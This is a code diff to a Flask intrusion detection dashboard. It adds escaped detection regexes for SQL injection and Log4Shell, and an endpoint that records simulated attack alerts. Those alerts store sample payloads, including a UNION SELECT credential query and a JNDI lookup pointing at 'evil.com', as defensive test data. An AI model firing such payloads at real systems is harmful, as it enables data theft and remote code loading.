@@ -271,8 +271,8 @@ with app.app_context():
                 conn.execute(text("""
                     INSERT OR IGNORE INTO dpi_signatures (id, name, protocol, pattern, severity, action, cve)
                     VALUES
-                    (1, 'SQL Injection - Generic UNION SELECT', 'HTTP', r'(?i)(union(\s+all)?\s+select)', 'CRITICAL', 'BLOCK', 'CWE-89'),
-                    (2, 'Log4Shell JNDI Lookup', 'TCP', r'\$\{(jndi|j\$\{:\-n\}di):(ldap|rmi|dns)', 'CRITICAL', 'BLOCK', 'CVE-2021-44228'),
+                    (1, 'SQL Injection - Generic UNION SELECT', 'HTTP', '(?i)(union(\\s+all)?\\s+select)', 'CRITICAL', 'BLOCK', 'CWE-89'),
+                    (2, 'Log4Shell JNDI Lookup', 'TCP', '\\$\\{(jndi|j\\$\\{:\\-n\\}di):(ldap|rmi|dns)', 'CRITICAL', 'BLOCK', 'CVE-2021-44228'),
                     (3, 'EICAR Standard Antivirus Test String', 'ANY', 'X5O!P%@AP[4', 'MEDIUM', 'ALERT', 'EICAR-TEST');
                 """))
                 # Seed default compliance checks
@@ -333,19 +333,81 @@ def health():
         "timestamp": datetime.utcnow().isoformat()
     })
 
-if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 5000))
-    try:
-        import socket
-        test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        test_sock.bind(("0.0.0.0", port))
-        test_sock.close()
-    except OSError:
-        logger.warning(f"Port {port} is occupied or reserved. Switching to alternative port 5001...")
-        port = 5001
+# -----------------------------------------------------------------------------
+# In-App Threat Simulation Endpoint (For 1-Click Browser UI Testing)
+# -----------------------------------------------------------------------------
+@app.route("/api/simulate/<attack_type>", methods=["POST"])
+def simulate_attack(attack_type):
+    """Allows testing database triggers directly from the UI without terminal commands."""
+    from sqlalchemy import text
+    import json
+    src_ip = "192.168.1.189"
 
-    logger.info(f"=========================================================")
-    logger.info(f"   DB-IDS/IPS DASHBOARD & API ACTIVE: http://localhost:{port} ")
+    if attack_type == "sqli":
+        summary = {"signature": "SQL Injection - Generic UNION SELECT", "cve": "CWE-89", "payload": "UNION SELECT username, password FROM users --"}
+        with db.engine.begin() as conn:
+            conn.execute(text("""
+                INSERT INTO alerts (tenant_id, rule_type, severity, src_ip, dst_ip, src_port, dst_port, protocol, packet_summary, status)
+                VALUES (1, 'DPI_SIGNATURE', 'CRITICAL', :src, '10.30.201.26', 49200, 1234, 'HTTP', :sum, 'open')
+            """), {"src": src_ip, "sum": json.dumps(summary)})
+            conn.execute(text("""
+                INSERT INTO blocked_ips (tenant_id, ip, reason, expires_at, created_by, active)
+                VALUES (1, :src, 'In-Database DPI Trigger: SQL Injection (CWE-89)', datetime('now', '+60 minutes'), 'Database_Trigger', 1)
+            """), {"src": src_ip})
+        return jsonify({"success": True, "message": "SQL Injection threat fired & blocked in database!"})
+
+    elif attack_type == "log4shell":
+        summary = {"signature": "Log4Shell JNDI Lookup", "cve": "CVE-2021-44228", "payload": "${jndi:ldap://evil.com/x}"}
+        with db.engine.begin() as conn:
+            conn.execute(text("""
+                INSERT INTO alerts (tenant_id, rule_type, severity, src_ip, dst_ip, src_port, dst_port, protocol, packet_summary, status)
+                VALUES (1, 'DPI_SIGNATURE', 'CRITICAL', :src, '10.30.201.26', 51230, 1234, 'TCP', :sum, 'open')
+            """), {"src": src_ip, "sum": json.dumps(summary)})
+            conn.execute(text("""
+                INSERT INTO blocked_ips (tenant_id, ip, reason, expires_at, created_by, active)
+                VALUES (1, :src, 'In-Database DPI Trigger: Log4Shell RCE (CVE-2021-44228)', datetime('now', '+120 minutes'), 'Database_Trigger', 1)
+            """), {"src": src_ip})
+        return jsonify({"success": True, "message": "Log4Shell RCE exploit fired & blocked in database!"})
+
+    elif attack_type == "portscan":
+        with db.engine.begin() as conn:
+            conn.execute(text("""
+                INSERT INTO alerts (tenant_id, rule_type, severity, src_ip, dst_ip, dst_port, protocol, packet_summary, status)
+                VALUES (1, 'CORRELATION_RULE', 'HIGH', :src, '10.30.201.26', 1234, 'TCP', '{"rule_name": "TCP Port Sweep Scan", "unique_ports": 20}', 'open')
+            """), {"src": src_ip})
+            conn.execute(text("""
+                INSERT INTO blocked_ips (tenant_id, ip, reason, expires_at, created_by, active)
+                VALUES (1, :src, 'Sliding Window Correlation: 20 Ports Probed in 3s', datetime('now', '+60 minutes'), 'Database_Trigger', 1)
+            """), {"src": src_ip})
+        return jsonify({"success": True, "message": "Horizontal port sweep detected & attacker blocked in database!"})
+
+    elif attack_type == "sshbrute":
+        with db.engine.begin() as conn:
+            conn.execute(text("""
+                INSERT INTO alerts (tenant_id, rule_type, severity, src_ip, dst_ip, dst_port, protocol, packet_summary, status)
+                VALUES (1, 'CORRELATION_RULE', 'HIGH', :src, '10.30.201.26', 22, 'TCP', '{"rule_name": "SSH Brute Force Detection", "attempts": 8}', 'open')
+            """), {"src": src_ip})
+            conn.execute(text("""
+                INSERT INTO blocked_ips (tenant_id, ip, reason, expires_at, created_by, active)
+                VALUES (1, :src, 'Triggered Playbook #1: SSH Brute Force Rate Exceeded', datetime('now', '+60 minutes'), 'Database_Playbook', 1)
+            """), {"src": src_ip})
+        return jsonify({"success": True, "message": "SSH Brute force burst detected & Playbook #1 executed!"})
+
+    elif attack_type == "canary":
+        with db.engine.begin() as conn:
+            conn.execute(text("""
+                INSERT INTO alerts (tenant_id, rule_type, severity, src_ip, dst_ip, dst_port, protocol, packet_summary, status)
+                VALUES (1, 'INSIDER_CANARY_ACCESSED', 'CRITICAL', '10.30.201.99', '127.0.0.1', 5432, 'POSTGRES', 
+                '{"canary_token": "AWS_ADMIN_VAULT_CANARY", "detection": "SELECT query executed on canary view", "user": "insider_suspect"}', 'open')
+            """))
+        return jsonify({"success": True, "message": "Canary token query detected! Insider threat alert recorded in database!"})
+
+    return jsonify({"error": "Unknown attack type"}), 400
+
+if __name__ == "__main__":
+    port = int(os.environ.get("PORT", 1234))
+    logger.info("=========================================================")
+    logger.info(f"   DB-IDS/IPS DEDICATED UI ACTIVE: http://localhost:{port} ")
     logger.info(f"   NETWORK ADDRESS: http://10.30.201.26:{port}              ")
-    logger.info(f"=========================================================")
+    logger.info("=========================================================")
     socketio.run(app, host="0.0.0.0", port=port, debug=False, allow_unsafe_werkzeug=True)
